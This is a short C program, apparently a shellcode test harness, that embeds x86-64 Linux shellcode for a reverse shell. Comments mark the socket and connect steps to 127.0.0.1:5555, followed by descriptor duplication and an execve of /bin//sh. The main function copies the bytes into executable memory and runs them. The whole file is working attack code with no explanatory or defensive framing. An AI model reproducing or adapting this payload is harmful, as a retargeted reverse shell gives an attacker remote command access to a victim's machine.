#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>

unsigned char shellcode[] =
    "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05" // socket
    "\x48\x97"
    "\x48\xb9\x02\x00\x15\xb3\x7f\x00\x00\x01" // sockaddr 127.0.0.1:5555
    "\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05" // connect
    "\x48\x31\xf6"
    "\x6a\x21\x58\x0f\x05"
    "\x48\xff\xc6\x6a\x21\x58\x0f\x05"
    "\x48\xff\xc6\x6a\x21\x58\x0f\x05"
    "\x48\x31\xd2\x52"
    "\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    "\x50\x48\x89\xe7\x52\x57\x48\x89\xe6"
    "\x48\x31\xc0\xb0\x3b\x0f\x05";

int main() {
    printf("Shellcode length: %lu\n", sizeof(shellcode)-1);
    fflush(stdout);
    void *exec = mmap(0, sizeof(shellcode), PROT_WRITE | PROT_READ | PROT_EXEC,
                       MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}